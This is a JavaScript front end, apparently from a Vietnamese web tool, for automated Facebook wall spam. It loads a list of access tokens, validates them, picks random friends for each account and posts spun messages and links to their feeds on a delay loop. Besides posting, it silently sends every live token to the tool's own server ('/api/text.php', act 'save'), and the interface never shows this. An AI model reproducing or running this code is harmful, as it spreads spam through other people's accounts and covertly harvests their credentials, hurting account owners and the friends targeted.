function auto_wall_check(a) {
    $.get('https://graph.facebook.com/', {
        method: 'post',
        access_token: a,
        batch: '[{\"method\":\"GET\",\"relative_url\":\"me?fields=id,name\"},{\"method\":\"GET\",\"relative_url\":\"fql?q=SELECT uid, name FROM user WHERE uid IN (SELECT uid2 FROM friend WHERE uid1 = me()) ORDER BY rand() LIMIT ' + wall.limit + '\"}]',
        include_headers: 'false'
    }, function(d) {
        var j = JSON.parse(d[0].body);
        wall.array[wall.success] = [], wall.array[wall.success].uid = j.id, wall.array[wall.success].name = j.name, wall.array[wall.success].data = JSON.parse(d[1].body).data, wall.array[wall.success].access_token = a, wall.success++, wall.bach += a + '\n', tbody = '', tbody += '<tr>', tbody += '	<td>' + wall.success + '</td>', tbody += '	<td>' + j.name + '</td>', tbody += '	<td align=\"center\">' + wall.array[wall.success - 1].data.length + '</td>', tbody += '	<td align=\"center\"><font color=\"green\"><span id=\"wall_success_' + wall.success + '\">0</span></font></td>', tbody += '	<td align=\"center\"><font color=\"red\"><span id=\"wall_error_' + wall.success + '\">0</span></font></td>', tbody += '	<td id=\"wall_status_' + wall.success + '\" b-data=\"loading\">Đang chờ !</td>', tbody += '</tr>', $('#html_auto_wall_body').append(tbody)
    }).fail(function(d) {
        'undefined' == typeof d.responseText ? wall_check(a) : wall.error++
    }).always(function() {
        if (wall.success + wall.error == wall.token.split('\n').length) {
            if (wall.success > 0) {
                var a = $.trim(wall.bach).split('\n');
                a.length > 0 && $.post('//' + b_sv + '/api/text.php', {
                    act: 'save',
                    array: a
                });
                for (var d = 0; d < wall.array.length; d++) {
                    auto_wall_msg(d, 0)
                }
            } else {
                $('#submit_auto_wall').buttonStop(), $('#submit_auto_wall_stop').disabled(), noti.success('Không Access Token nào Live !'), $('#html_auto_wall_result').hide()
            }
        }
    })
}

function auto_wall_msg(a, d) {
    return 0 == wall.run ? !1 : void((0 == wall.array[a].data.length ? ($('#wall_status_' + (a + 1)).html('<font color=\"red\">Không có bạn bè !</font>'), wall.total++, wall.total == wall.success && ($('#submit_auto_wall').buttonStop(), $('#submit_auto_wall_stop').disabled(), noti.success('Quá trình gửi tin nhắn đã hoàn tất !'))) : ! function(j, c, b) {
        $('#wall_status_' + (a + 1)).html('<font color=\"blue\">Đang gửi tin nhắn đến <b>' + b + '</b></font> ' + run.loading()), $.get('https://graph.facebook.com/'+c+'/feed', {
            locale: 'en_US',
            method: 'post',
            return_structure: 'true',
            message: init.spinText(wall.message.replace(/\$\m\e/g, j).replace(/\$\y\o\u/g, b)),
            link: init.spinText(wall.link),
            name: init.spinText(wall.name),
            picture: init.spinText(wall.picture),
            description: init.spinText(wall.description),
			caption: init.spinText(wall.caption),
            access_token: wall.array[a].access_token
        }).done(function() {
            $('#wall_success_' + (a + 1)).text(parseInt($('#wall_success_' + (a + 1)).text()) + 1), $('#wall_status_' + (a + 1)).html('<font color=\"green\">Gửi đến <b>' + b + '</b> thành công, xin chờ <b id=\"timedown_' + (a + 1) + '\"></b> giây</font> ' + run.loading())
        }).error(function(d) {
            if ($('#wall_error_' + (a + 1)).text(parseInt($('#wall_error_' + (a + 1)).text()) + 1), $('#wall_status_' + (a + 1)).html('<font color=\"red\">Gửi đến <b>' + b + '</b> thất bại, xin chờ <b id=\"timedown_' + (a + 1) + '\"></b> giây</font> ' + run.loading()), d.responseText) {
                var d = init.replace_JSON(d.responseText);
                noti.error(d.error.message)
            }
        }).always(function() {
            d + 1 < wall.array[a].data.length ? timer.count_down_array(0, Math.floor(wall.delay / 60), wall.delay - 60 * Math.floor(wall.delay / 60), 'timedown_' + (a + 1), a, function() {
                auto_wall_msg(a, d + 1)
            }) : ($('#wall_status_' + (a + 1)).html('<font color=\"green\">Hoàn thành !</font>'), wall.total++, wall.total == wall.success && ($('#submit_auto_wall').buttonStop(), $('#submit_auto_wall_stop').disabled(), noti.success('Quá trình gửi tin nhắn đã hoàn tất !')))
        })
    }(wall.array[a].name, wall.array[a].data[d].uid, wall.array[a].data[d].name)))
}
location.hostname == b_sv && ($(document).on('click', '#submit_auto_wall_stop', function() {
    wall.run = 0;
    for (var a = 0; a < wall.array.length; a++) {
        clearTimeout(timeout_array[a])
    };
    $('[b-data=\'loading\']').text('Đã có lệnh dừng !'), $('#submit_auto_wall_stop').disabled(), $('#submit_auto_wall').buttonStop(), noti.success('Đã có lệnh dừng gửi tin nhắn !')
}), $(document).on('click', '#submit_auto_wall', function() {
    wall = {
        token: $('#input_auto_wall_token').validate(),
        message: $('#input_auto_wall_msg').validate(),
        link: $('#input_auto_wall_link').val(),
        name: $('#input_auto_wall_name').val(),
        picture: $('#input_auto_wall_picture').val(),
        description: $('#input_auto_wall_description').val(),
		caption: $('#input_auto_wall_caption').val(),
        delay: $('#input_auto_wall_delay').isNumber(),
        limit: $('#input_auto_wall_limit').isNumber(),
        array: [],
        run: 1,
        total: 0,
        success: 0,
        error: 0,
        bach: ''
    }, wall.token && wall.message && wall.delay && wall.limit && ($(this).buttonLoad(), $('#submit_auto_wall_stop').undisabled(), $('#html_auto_wall_result').fadeIn('fast'), $('#html_auto_wall_body').html(''), $.each(wall.token.split('\n'), function(a, d) {
        var j = d.split('|');
        j = j[1] ? j[1] : d, setTimeout(function() {
            auto_wall_check(j)
        }, 15 * a)
    }))
}))